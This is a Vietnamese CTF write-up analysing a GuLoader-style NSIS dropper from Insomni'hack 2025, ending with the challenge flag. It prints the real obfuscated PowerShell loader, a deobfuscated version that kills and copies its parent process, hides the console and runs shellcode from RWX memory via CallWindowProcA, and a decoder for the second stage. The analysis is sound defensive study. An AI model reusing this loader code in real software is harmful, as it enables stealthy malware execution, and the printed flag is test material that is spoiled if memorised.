---
title: Insomni'hack 2025 [GuLosity challenge]
time: 2025-07-24 12:00:00
categories: [CTF]
tags: [foreniscs,malware,shellcode]
image: /assets/posts/Insomnihack2025/background.png
---
## Description
In this real DFIR case study, the final payloads have been replaced to allow analysts to dissect the malware and fully understand its execution chain.

The archive is protected with the "infected" password.

!!! AS IT IS A REAL MALWARE, PLEASE TAKE THE NECESSARY PRECAUTIONS !!!
## Solution
##### Challenge này chỉ cung cấp cho chúng ta 1 file exe.
##### Với 1 vài bước xác định đơn giản ta có 1 vài thông tin như sau 

| Thông tin                                    | Xác định bằng công cụ nào                     |
|---------------------------------------------|-----------------------------------------------|
| Loại file: PE32 (Windows, GUI)              | PEid, Detect It Easy (DIE)                    |
| Hệ điều hành đích: Windows (95) [i386, 32-bit] | Detect It Easy (DIE)                          |
| Compiler: Microsoft Visual C/C++ 13.10.4035 | Detect It Easy (DIE)                          |
| Ngôn ngữ lập trình: C                        | Detect It Easy (DIE)                          |
| Đóng gói bằng NSIS Installer (v3.04)         | Detect It Easy (DIE), 7-Zip, binwalk          |
| Giải nén LZMA + chế độ solid                 | Detect It Easy (DIE), 7-Zip                   |
| Dữ liệu bị nén/đóng gói: có overlay lạ       | Detect It Easy (DIE), PE-bear, Exeinfo PE     |
| Kỹ thuật đóng gói: Heur.Packer (Strange overlay) | Detect It Easy (heuristic engine), PEiD     |
| Dữ liệu overlay: NSIS data tại offset 0x9000 | Detect It Easy (DIE), PEview, HxD             |
| SHA256: `90feb6e2b2c20a4a67e1b8e3cdec49b762510b6f9a5546c04c730cd6dfba1ce2`                  | VirusTotal, Hybrid Analysis, Malshare         |

##### Okay, vì nó được pack bằng `NSIS Installer` nên cách nhanh nhất là đổi đuôi file và giải nén. Đồng thời mình cũng tiến hành chạy động trong https://app.any.run
![image](/assets/posts/Insomnihack2025/1.png)
##### Ở đây ta thấy nó khởi chạy 1 lệnh powershell với nội dung 
```
"powershell.exe" -windowstyle hidden "$Auscultative223=Get-Content 'C:\Users\admin\AppData\Roaming\opslagsvrkerne\incorporative\lathis\Samariterkursussets\Chemosurgical207\Stippled.leg';$Brontology=$Auscultative223.SubString(50386,3);.$Brontology($Auscultative223)"
```
-> Payload này sử dụng iex để thực thi đoạn mã powershell trong Stippled.leg
##### Đồng thời nó drop xuống 1 vài file để dễ dàng triển khai quá trình khai thác sau này
![image](/assets/posts/Insomnihack2025/2.png)
![image](/assets/posts/Insomnihack2025/3.png)
##### Đây là file có liên quan đến payload powershell
![image](/assets/posts/Insomnihack2025/4.png)
![image](/assets/posts/Insomnihack2025/5.png)
##### Vì file bị obfucate khá nặng nên mình sử dụng công cụ PowerDecode để deobfucate

```powershell
;
Function Mutarotation04 ([String]$Herbaceously124, $Milieustttelovs = 0){
	 $Frumentum = New-Object byte[] ($Herbaceously124.Length / 2);
	 For($Sane=0;
	 $Sane -lt $Herbaceously124.Length;
	 $Sane+=2){
		 $Frumentum[$Sane/2] = [convert]::ToByte($Herbaceously124.Substring($Sane, 2), 16);
		 $Frumentum[$Sane/2] = Conglomerate8 $Frumentum[$Sane/2] 133;
	}
	 $Garvningens=[String][System.Text.Encoding]::ASCII.GetString($Frumentum);
	 if ($Milieustttelovs) {
		 . ($Sialagogic750) $Garvningens;
	}
	else {
		;
		 $Garvningens;
	}
}
$Alvorlig0=Mutarotation04 'D6FCF6F1E0E8ABE1E9E9';
$Alvorlig1=Mutarotation04 'C8ECE6F7EAF6EAE3F1ABD2ECEBB6B7ABD0EBF6E4E3E0CBE4F1ECF3E0C8E0F1EDEAE1F6';
$Alvorlig2=Mutarotation04 'C2E0F1D5F7EAE6C4E1E1F7E0F6F6';
$Alvorlig3=Mutarotation04 'D6FCF6F1E0E8ABD7F0EBF1ECE8E0ABCCEBF1E0F7EAF5D6E0F7F3ECE6E0F6ABCDE4EBE1E9E0D7E0E3';
$Alvorlig4=Mutarotation04 'F6F1F7ECEBE2';
$Alvorlig5=Mutarotation04 'C2E0F1C8EAE1F0E9E0CDE4EBE1E9E0';
$Alvorlig6=Mutarotation04 'D7D1D6F5E0E6ECE4E9CBE4E8E0A9A5CDECE1E0C7FCD6ECE2A9A5D5F0E7E9ECE6';
$Alvorlig7=Mutarotation04 'D7F0EBF1ECE8E0A9A5C8E4EBE4E2E0E1';
$Alvorlig8=Mutarotation04 'D7E0E3E9E0E6F1E0E1C1E0E9E0E2E4F1E0';
$Alvorlig9=Mutarotation04 'CCEBC8E0E8EAF7FCC8EAE1F0E9E0';
$Virkers0=Mutarotation04 'C8FCC1E0E9E0E2E4F1E0D1FCF5E0';
$Virkers1=Mutarotation04 'C6E9E4F6F6A9A5D5F0E7E9ECE6A9A5D6E0E4E9E0E1A9A5C4EBF6ECC6E9E4F6F6A9A5C4F0F1EAC6E9E4F6F6';
$Virkers2=Mutarotation04 'CCEBF3EAEEE0';
$Virkers3=Mutarotation04 'D5F0E7E9ECE6A9A5CDECE1E0C7FCD6ECE2A9A5CBE0F2D6E9EAF1A9A5D3ECF7F1F0E4E9';
$Virkers4=Mutarotation04 'D3ECF7F1F0E4E9C4E9E9EAE6';
$Virkers5=Mutarotation04 'EBF1E1E9E9';
$Virkers6=Mutarotation04 'CBF1D5F7EAF1E0E6F1D3ECF7F1F0E4E9C8E0E8EAF7FC';
$Virkers8=Mutarotation04 'D9';
$Vrdiganedrifters=Mutarotation04 'D0D6C0D7B6B7';
$Resonans=Mutarotation04 'C6E4E9E9D2ECEBE1EAF2D5F7EAE6C4';
$Denguesudifons = Mutarotation04 'EEE0F7EBE0E9B6B7';
$Mellemvrenderne = Mutarotation04 'F0F6E0F7B6B7';
$Mutarotation03 = Mutarotation04 'C2E0F1C6EAEBF6EAE9E0D2ECEBE1EAF2';
$Mutarotation00=Mutarotation04 'D6EDEAF2D2ECEBE1EAF2';
$Merkantilisering= "$env:temp\Nonresolvable.exe";
Mutarotation04 'A1E2E9EAE7E4E9BFD6ECF1F7E0EBE1E0B7B7A5B8A5ADC2E0F1A8D2E8ECCAE7EFE0E6F1A5D2ECEBB6B7DAD5F7EAE6E0F6F6A5F9A5D2EDE0F7E0A8CAE7EFE0E6F1A5FEA5A1D5CCC1A5A8E6EAEBF1E4ECEBF6A5A1DAABD5F7EAE6E0F6F6CCC1A5F8ACABD5E4F7E0EBF1D5F7EAE6E0F6F6CCC1' 1;
Mutarotation04 'A1E2E9EAE7E4E9BFD6ECF1F7E0EBE1E0B7B6A5B8A5C2E0F1A8D5F7EAE6E0F6F6A5A8CCE1A5A1D6ECF1F7E0EBE1E0B7B7A5A8C3ECE9E0D3E0F7F6ECEAEBCCEBE3EAA5F9A5D6E0E9E0E6F1A5A8C0FDF5E4EBE1D5F7EAF5E0F7F1FCA5C3ECE9E0CBE4E8E0' 1;
Mutarotation04 'D6F1EAF5A8D5F7EAE6E0F6F6A5A8CCC1A5A1D6ECF1F7E0EBE1E0B7B7A5A8C3EAF7E6E0' 1;
Mutarotation04 'C6EAF5FCA8CCF1E0E8A5A1D6ECF1F7E0EBE1E0B7B6A5A8C1E0F6F1ECEBE4F1ECEAEBA5A1C8E0F7EEE4EBF1ECE9ECF6E0F7ECEBE2A5A8D7E0E6F0F7F6E0A5A8C3EAF7E6E0' 1;
function Sitrende01 ($Denguesncestry, $Prdikatnavnet) {
	Mutarotation04 'A1E2E9EAE7E4E9BFD6ECF1F7E0EBE1E0B5BDA5B8A5ADDEC4F5F5C1EAE8E4ECEBD8BFBFC6F0F7F7E0EBF1C1EAE8E4ECEBABC2E0F1C4F6F6E0E8E7E9ECE0F6ADACA5F9A5D2EDE0F7E0A8CAE7EFE0E6F1A5FEA5A1DAABC2E9EAE7E4E9C4F6F6E0E8E7E9FCC6E4E6EDE0A5A8C4EBE1A5A1DAABC9EAE6E4F1ECEAEBABD6F5E9ECF1ADA1D3ECF7EEE0F7F6BDACDEA8B4D8ABC0F4F0E4E9F6ADA1C4E9F3EAF7E9ECE2B5ACA5F8ACABC2E0F1D1FCF5E0ADA1C4E9F3EAF7E9ECE2B4AC' 1;
	Mutarotation04 'A1E2E9EAE7E4E9BFD6ECF1F7E0EBE1E0B4B5A5B8A5A1D6ECF1F7E0EBE1E0B5BDABC2E0F1C8E0F1EDEAE1ADA1C4E9F3EAF7E9ECE2B7A9A5DED1FCF5E0DED8D8A5C5ADA1C4E9F3EAF7E9ECE2B6A9A5A1C4E9F3EAF7E9ECE2B1ACAC' 1;
	Mutarotation04 'F7E0F1F0F7EBA5A1D6ECF1F7E0EBE1E0B4B5ABCCEBF3EAEEE0ADA1EBF0E9E9A9A5C5ADDED6FCF6F1E0E8ABD7F0EBF1ECE8E0ABCCEBF1E0F7EAF5D6E0F7F3ECE6E0F6ABCDE4EBE1E9E0D7E0E3D8ADCBE0F2A8CAE7EFE0E6F1A5D6FCF6F1E0E8ABD7F0EBF1ECE8E0ABCCEBF1E0F7EAF5D6E0F7F3ECE6E0F6ABCDE4EBE1E9E0D7E0E3ADADCBE0F2A8CAE7EFE0E6F1A5CCEBF1D5F1F7ACA9A5ADA1D6ECF1F7E0EBE1E0B5BDABC2E0F1C8E0F1EDEAE1ADA1C4E9F3EAF7E9ECE2B0ACACABCCEBF3EAEEE0ADA1EBF0E9E9A9A5C5ADA1C1E0EBE2F0E0F6EBE6E0F6F1F7FCACACACACA9A5A1D5F7E1ECEEE4F1EBE4F3EBE0F1ACAC' 1;
}
function Sitrende00 ([Parameter(Position = 0)] [Type[]] $Hipponous,[Parameter(Position = 1)] [Type] $Denguesruspice = [Void]) {
	Mutarotation04 'A1E2E9EAE7E4E9BFD6ECF1F7E0EBE1E0B4B0A5B8A5DEC4F5F5C1EAE8E4ECEBD8BFBFC6F0F7F7E0EBF1C1EAE8E4ECEBABC1E0E3ECEBE0C1FCEBE4E8ECE6C4F6F6E0E8E7E9FCADADCBE0F2A8CAE7EFE0E6F1A5D6FCF6F1E0E8ABD7E0E3E9E0E6F1ECEAEBABC4F6F6E0E8E7E9FCCBE4E8E0ADA1C4E9F3EAF7E9ECE2BDACACA9A5DED6FCF6F1E0E8ABD7E0E3E9E0E6F1ECEAEBABC0E8ECF1ABC4F6F6E0E8E7E9FCC7F0ECE9E1E0F7C4E6E6E0F6F6D8BFBFD7F0EBACABC1E0E3ECEBE0C1FCEBE4E8ECE6C8EAE1F0E9E0ADA1C4E9F3EAF7E9ECE2BCA9A5A1E3E4E9F6E0ACABC1E0E3ECEBE0D1FCF5E0ADA1D3ECF7EEE0F7F6B5A9A5A1D3ECF7EEE0F7F6B4A9A5DED6FCF6F1E0E8ABC8F0E9F1ECE6E4F6F1C1E0E9E0E2E4F1E0D8AC' 1;
	Mutarotation04 'A1D6ECF1F7E0EBE1E0B4B0ABC1E0E3ECEBE0C6EAEBF6F1F7F0E6F1EAF7ADA1C4E9F3EAF7E9ECE2B3A9A5DED6FCF6F1E0E8ABD7E0E3E9E0E6F1ECEAEBABC6E4E9E9ECEBE2C6EAEBF3E0EBF1ECEAEBF6D8BFBFD6F1E4EBE1E4F7E1A9A5A1CDECF5F5EAEBEAF0F6ACABD6E0F1CCE8F5E9E0E8E0EBF1E4F1ECEAEBC3E9E4E2F6ADA1C4E9F3EAF7E9ECE2B2AC' 1;
	Mutarotation04 'A1D6ECF1F7E0EBE1E0B4B0ABC1E0E3ECEBE0C8E0F1EDEAE1ADA1D3ECF7EEE0F7F6B7A9A5A1D3ECF7EEE0F7F6B6A9A5A1C1E0EBE2F0E0F6F7F0F6F5ECE6E0A9A5A1CDECF5F5EAEBEAF0F6ACABD6E0F1CCE8F5E9E0E8E0EBF1E4F1ECEAEBC3E9E4E2F6ADA1C4E9F3EAF7E9ECE2B2AC' 1;
	Mutarotation04 'F7E0F1F0F7EBA5A1D6ECF1F7E0EBE1E0B4B0ABC6F7E0E4F1E0D1FCF5E0ADAC' 1;
	;
}
Mutarotation04 'A1E2E9EAE7E4E9BFD6ECF1F7E0EBE1E0B4B3A5B8A5DED6FCF6F1E0E8ABD7F0EBF1ECE8E0ABCCEBF1E0F7EAF5D6E0F7F3ECE6E0F6ABC8E4F7F6EDE4E9D8BFBFC2E0F1C1E0E9E0E2E4F1E0C3EAF7C3F0EBE6F1ECEAEBD5EAECEBF1E0F7ADADD6ECF1F7E0EBE1E0B5B4A5A1C1E0EBE2F0E0F6F0E1ECE3EAEBF6A5A1D3ECF7EEE0F7F6B1ACA9A5ADD6ECF1F7E0EBE1E0B5B5A5C5ADDECCEBF1D5F1F7D8A9A5DED0CCEBF1B6B7D8A9A5DED0CCEBF1B6B7D8A9A5DED0CCEBF1B6B7D8ACA5ADDECCEBF1D5F1F7D8ACACAC' 1;
Mutarotation04 'A1E2E9EAE7E4E9BFD6ECF1F7E0EBE1E0B4B2A5B8A5DED6FCF6F1E0E8ABD7F0EBF1ECE8E0ABCCEBF1E0F7EAF5D6E0F7F3ECE6E0F6ABC8E4F7F6EDE4E9D8BFBFC2E0F1C1E0E9E0E2E4F1E0C3EAF7C3F0EBE6F1ECEAEBD5EAECEBF1E0F7ADADD6ECF1F7E0EBE1E0B5B4A5A1C8E0E9E9E0E8F3F7E0EBE1E0F7EBE0A5A1C8F0F1E4F7EAF1E4F1ECEAEBB5B5ACA9A5ADD6ECF1F7E0EBE1E0B5B5A5C5ADDECCEBF1D5F1F7D8A9A5DED0CCEBF1B6B7D8ACA5ADDECCEBF1D5F1F7D8ACACAC' 1;
Mutarotation04 'A1E2E9EAE7E4E9BFD6ECF1F7E0EBE1E0B4BDA5B8A5DED6FCF6F1E0E8ABD7F0EBF1ECE8E0ABCCEBF1E0F7EAF5D6E0F7F3ECE6E0F6ABC8E4F7F6EDE4E9D8BFBFC2E0F1C1E0E9E0E2E4F1E0C3EAF7C3F0EBE6F1ECEAEBD5EAECEBF1E0F7ADADD6ECF1F7E0EBE1E0B5B4A5A1C1E0EBE2F0E0F6F0E1ECE3EAEBF6A5A1C8F0F1E4F7EAF1E4F1ECEAEBB5B6ACA9A5ADD6ECF1F7E0EBE1E0B5B5A5C5ADDECCEBF1D5F1F7D8ACA5ADDECCEBF1D5F1F7D8ACACAC' 1;
Mutarotation04 'A1E2E9EAE7E4E9BFD6ECF1F7E0EBE1E0B4BCA5B8A5A1D6ECF1F7E0EBE1E0B4BDABCCEBF3EAEEE0ADB5AC' 1;
Mutarotation04 'A1D6ECF1F7E0EBE1E0B4B2ABCCEBF3EAEEE0ADA1D6ECF1F7E0EBE1E0B4BCA9A5B5AC' 1;
$Digenea = Sitrende01 $Virkers5 $Virkers6;
Mutarotation04 'A1E2E9EAE7E4E9BFD6ECF1F7E0EBE1E0B6A5B8A5A1D6ECF1F7E0EBE1E0B4B3ABCCEBF3EAEEE0ADDECCEBF1D5F1F7D8BFBFDFE0F7EAA9A5B4B0B7B4B6A9A5B5FDB6B5B5B5A9A5B5FDB1B5AC' 1;
Mutarotation04 'A1E2E9EAE7E4E9BFD6ECF1F7E0EBE1E0B7B5A5B8A5A1D6ECF1F7E0EBE1E0B4B3ABCCEBF3EAEEE0ADDECCEBF1D5F1F7D8BFBFDFE0F7EAA9A5BCBDBDB2B6B6B1B1A9A5B5FDB6B5B5B5A9A5B5FDB1AC' 1;
$Sitrende2="$env:APPDATA\opslagsvrkerne\incorporative\lathis\jackass.Pri";
Mutarotation04 'A1E2E9EAE7E4E9BFC1ECF1E6EDE0F6A5B8A5DED6FCF6F1E0E8ABCCCAABC3ECE9E0D8BFBFD7E0E4E1C4E9E9C7FCF1E0F6ADA1D6ECF1F7E0EBE1E0B7AC' 1;
Mutarotation04 'DED6FCF6F1E0E8ABD7F0EBF1ECE8E0ABCCEBF1E0F7EAF5D6E0F7F3ECE6E0F6ABC8E4F7F6EDE4E9D8BFBFC6EAF5FCADA1C1ECF1E6EDE0F6A9A5B6B1B6B4A9A5A5A1D6ECF1F7E0EBE1E0B6A9A5B4B0B7B4B6AC' 1;
$Rappellvqr=$Ditches.count-15213-3431;
Mutarotation04 'DED6FCF6F1E0E8ABD7F0EBF1ECE8E0ABCCEBF1E0F7EAF5D6E0F7F3ECE6E0F6ABC8E4F7F6EDE4E9D8BFBFC6EAF5FCADA1C1ECF1E6EDE0F6A9A5B4B0B7B4B6AEB6B1B6B4A9A5A1D6ECF1F7E0EBE1E0B7B5A9A5A1D7E4F5F5E0E9E9F3F4F7AC' 1;
Mutarotation04 'A1E2E9EAE7E4E9BFD6ECF1F7E0EBE1E0B7B4A5B8A5DED6FCF6F1E0E8ABD7F0EBF1ECE8E0ABCCEBF1E0F7EAF5D6E0F7F3ECE6E0F6ABC8E4F7F6EDE4E9D8BFBFC2E0F1C1E0E9E0E2E4F1E0C3EAF7C3F0EBE6F1ECEAEBD5EAECEBF1E0F7ADADD6ECF1F7E0EBE1E0B5B4A5A1D3F7E1ECE2E4EBE0E1F7ECE3F1E0F7F6A5A1D7E0F6EAEBE4EBF6ACA9A5ADD6ECF1F7E0EBE1E0B5B5A5C5ADDECCEBF1D5F1F7D8A9A5DECCEBF1D5F1F7D8A9A5DECCEBF1D5F1F7D8A9A5DECCEBF1D5F1F7D8A9A5DECCEBF1D5F1F7D8ACA5ADDECCEBF1D5F1F7D8ACACAC' 1;
Mutarotation04 'A1D6ECF1F7E0EBE1E0B7B4ABCCEBF3EAEEE0ADA1D6ECF1F7E0EBE1E0B6A9A1D6ECF1F7E0EBE1E0B7B5A9A1C1ECE2E0EBE0E4A9B5A9B5AC' 1 # 
```
##### Tuy nó vẫn đang còn rối nhưng ta cũng có thể đọc được 1 vài chuỗi, theo đó các chuỗi được làm rối thông qua hàm `Mutarotation04` xor các chuỗi với 133
##### Mình test thử 1 chuỗi với cyberchef
![image](/assets/posts/Insomnihack2025/6.png)
##### Đây là đoạn mã powershell sau khi deobf hoàn toàn và comment giải thích 

```powershell
# Lấy PID tiến trình cha của script
$parentPID = (Get-WmiObject Win32_Process | Where-Object { $PID -contains $_.ProcessID }).ParentProcessID
# Lấy đường dẫn tiến trình cha
$parentPath = (Get-Process -Id $parentPID -FileVersionInfo | Select -ExpandProperty FileName)
# Dừng tiến trình cha
Stop-Process -Id $parentPID -Force
# Copy tiến trình cha vào temp
$copyPath = "$env:TEMP\Nonresolvable.exe"
Copy-Item $parentPath -Destination $copyPath -Force

# Hàm lấy địa chỉ hàm API bằng GetProcAddress
function GetProcAddressWrapper($dll, $funcName) {
    $systemType = ([AppDomain]::CurrentDomain.GetAssemblies() |
        Where-Object { $_.GlobalAssemblyCache -and $_.Location.Split('\')[-1] -eq 'System.dll' }).GetType('Microsoft.Win32.UnsafeNativeMethods')

    $getProcAddressMethod = $systemType.GetMethod('GetProcAddress', [Type[]] @(
        [System.Runtime.InteropServices.HandleRef], [string]
    ))

    $getModuleHandle = $systemType.GetMethod('GetModuleHandle').Invoke($null, @($dll))
    $handleRef = New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), $getModuleHandle)

    return $getProcAddressMethod.Invoke($null, @($handleRef, $funcName))
}

# Tạo delegate .NET động để gọi API native
function CreateDelegateType([Type[]] $paramTypes, [Type] $returnType = [Void]) {
    $assemblyName = New-Object System.Reflection.AssemblyName("ReflectedDelegate")
    $assembly = [AppDomain]::CurrentDomain.DefineDynamicAssembly($assemblyName, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $module = $assembly.DefineDynamicModule("InMemoryModule", $false)
    $typeBuilder = $module.DefineType("MyDelegateType", "Class, Public, Sealed, AnsiClass, AutoClass", [System.MulticastDelegate])

    $ctor = $typeBuilder.DefineConstructor("RTSpecialName, HideBySig, Public", [System.Reflection.CallingConventions]::Standard, $paramTypes)
    $ctor.SetImplementationFlags("Runtime, Managed")

    $invoke = $typeBuilder.DefineMethod("Invoke", "Public, HideBySig, NewSlot, Virtual", $returnType, $paramTypes)
    $invoke.SetImplementationFlags("Runtime, Managed")

    return $typeBuilder.CreateType()
}

# Lấy các con trỏ hàm cần thiết từ DLL hệ thống
$ptrVirtualAlloc     = GetProcAddressWrapper "kernel32" "VirtualAlloc"
$ptrNtProtectVM      = GetProcAddressWrapper "ntdll"   "NtProtectVirtualMemory"
$ptrGetConsoleWindow = GetProcAddressWrapper "user32"  "GetConsoleWindow"
$ptrShowWindow       = GetProcAddressWrapper "user32"  "ShowWindow"
$ptrCallWindowProcA  = GetProcAddressWrapper "user32"  "CallWindowProcA"

# Tạo delegate gọi trực tiếp các hàm API
$VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    $ptrVirtualAlloc,
    (CreateDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))
)

$NtProtectVM = $ptrNtProtectVM  # Sẽ truyền thẳng vào CallWindowProcA như đối số

$GetConsoleWindow = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    $ptrGetConsoleWindow,
    (CreateDelegateType @() ([IntPtr]))
)

$ShowWindow = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    $ptrShowWindow,
    (CreateDelegateType @([IntPtr], [UInt32]) ([IntPtr]))
)

$CallWindowProcA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    $ptrCallWindowProcA,
    (CreateDelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([IntPtr]))
)

# Ẩn cửa sổ console
$consoleHandle = $GetConsoleWindow.Invoke()
$ShowWindow.Invoke($consoleHandle, 0)  # 0 = SW_HIDE

# Cấp phát vùng nhớ
$execMem = $VirtualAlloc.Invoke([IntPtr]::Zero, 15213, 0x3000, 0x40)     # PAGE_EXECUTE_READWRITE
$dataMem = $VirtualAlloc.Invoke([IntPtr]::Zero, 98873344, 0x3000, 0x4)   # PAGE_READWRITE

# Đọc payload từ file ẩn
$payloadFile = "$env:APPDATA\opslagsvrkerne\incorporative\lathis\jackass.Pri"
$payloadBytes = [System.IO.File]::ReadAllBytes($payloadFile)

# Copy shellcode vào vùng thực thi
[System.Runtime.InteropServices.Marshal]::Copy($payloadBytes, 3431, $execMem, 15213)

# Copy phần dữ liệu còn lại vào vùng dữ liệu
$remainingLen = $payloadBytes.Length - 3431 - 15213
[System.Runtime.InteropServices.Marshal]::Copy($payloadBytes, 3431 + 15213, $dataMem, $remainingLen)

# Thực thi shellcode thông qua CallWindowProcA để né phát hiện
$CallWindowProcA.Invoke($execMem, $dataMem, $NtProtectVM, 0, 0)
```
![image](/assets/posts/Insomnihack2025/7.png)
##### Sau khi cấp phát vùng nhớ chúng copy 2 đoạn shellcode vào vùng nhớ từ file jackass.Pri đã được drop
##### Tuy nhiên đoạn shellcode đầu tiên được copy vào $execMem có quyền thực thi (0x40 - PAGE_EXECUTE_READWRITE), còn $dataMem được copy vào $dataMem chỉ có quyền đọc ghi (0x4 - PAGE_READWRITE) 
##### => Vì vậy có thể thấy rằng đoạn $execMem sẽ là shellcode thực thi chính

| Vùng nhớ                 | Biến đại diện | Quyền truy cập           | Kích thước (byte)                    | Offset trong file payload (`jackass.Pri`) |
|--------------------------|---------------|---------------------------|--------------------------------------|-------------------------------------------|
| Shellcode 1              | `$execMem`    | `PAGE_EXECUTE_READWRITE` | `15213`                              | Bắt đầu từ offset `3431`                  |
| Shellcode 2 hoặc dữ liệu | `$dataMem`    | `PAGE_READWRITE`         | `payloadBytes.Length - 3431 - 15213` | Bắt đầu từ offset `3431 + 15213`          |


##### Tiến hành trích xuất từng đoạn shellcode ra.
```powershell
──(kali㉿kali)-[/home/kali/Downloads/test]
└─PS> $payloadFile = "./jackass.Pri"

┌──(kali㉿kali)-[/home/kali/Downloads/test]
└─PS> $Ditches = [System.IO.File]::ReadAllBytes($PayloadFile)

┌──(kali㉿kali)-[/home/kali/Downloads/test]
└─PS> $Shellcode1 = $Ditches[3431..(3431+15213-1)]           

┌──(kali㉿kali)-[/home/kali/Downloads/test]
└─PS> [System.IO.File]::WriteAllBytes("shellcode1.bin", $Shellcode1)

┌──(kali㉿kali)-[/home/kali/Downloads/test]
└─PS> $Shellcode2Length = $Ditches.Length - 3431 - 15213     

┌──(kali㉿kali)-[/home/kali/Downloads/test]
└─PS> $Shellcode2 = $Ditches[(3431 + 15213)..($Ditches.Length - 1)]

┌──(kali㉿kali)-[/home/kali/Downloads/test]
└─PS> [System.IO.File]::WriteAllBytes("shellcode2.bin", $Shellcode2)     
```
##### Sau khi đã lấy được 2 đoạn shellcode đó, mình dùng công cụ [Online x86 / x64 Assembler and Disassembler](https://defuse.ca/online-x86-assembler.htm) để decompile nó ra asm.
![image](/assets/posts/Insomnihack2025/8.png)
##### Đoạn gọi thực thi của CallWindowProcA là `$CallWindowProcA.Invoke($execMem, $dataMem, $NtProtectVM, 0, 0)`
##### Vì cấu trúc của CallWindowProcA có dạng 

```C
LRESULT CallWindowProcA(
  WNDPROC lpPrevWndFunc, // $execMem +0
  HWND    hWnd,          // $dataMem +4
  UINT    Msg,           // mã thông điệp +8
  WPARAM  wParam,        // tham số 1 +12
  LPARAM  lParam         // tham số 2 +16
);
```
##### Vì sử dụng kiến trúc x86 (32 bit) nên mỗi thành ghi có độ dài 4 byte cho nên đoạn asm `mov    esi,DWORD PTR [esp+0x4]` là đang trỏ tới tham số tiếp theo là `$dataMem`, đó chính là đoạn shellcode thứ 2 đã bị mã hóa
##### Cách thức giải mã như sau 
```
1. Lấy dữ liệu mã hóa từ esp+4 (tham số đầu vào).

2. Key XOR ban đầu: 0xA2D0668E.

3. Lặp 79 byte:

    Lấy từng byte mã hóa.

    XOR với byte thấp của key.

    Ghi kết quả ra cùng vị trí.

    Xoay phải key 8 bit để đổi byte XOR kế tiếp.

4. Sau khi xong, nhảy đến vùng đã giải mã để thực thi shellcode.
```
##### Viết script python nhỏ để giải mã 

```python
def ror32(val, n):
    return ((val >> n) | (val << (32 - n))) & 0xFFFFFFFF

def decode(data, key=0xA2D0668E):
    decoded = bytearray()
    for i in range(len(data)):
        xor_byte = key & 0xFF
        decoded.append(data[i] ^ xor_byte)
        key = ror32(key, 8)
    return decoded

with open("shellcode2.bin", "rb") as f:
    encrypted = f.read()

decoded = decode(encrypted)

with open("shellcode_unxor.bin", "wb") as f:
    f.write(decoded)
```
![image](/assets/posts/Insomnihack2025/9.png)
### `Flag : INS{GuL04d3r1$R34llyBr34k1ngMyB4ll$}`
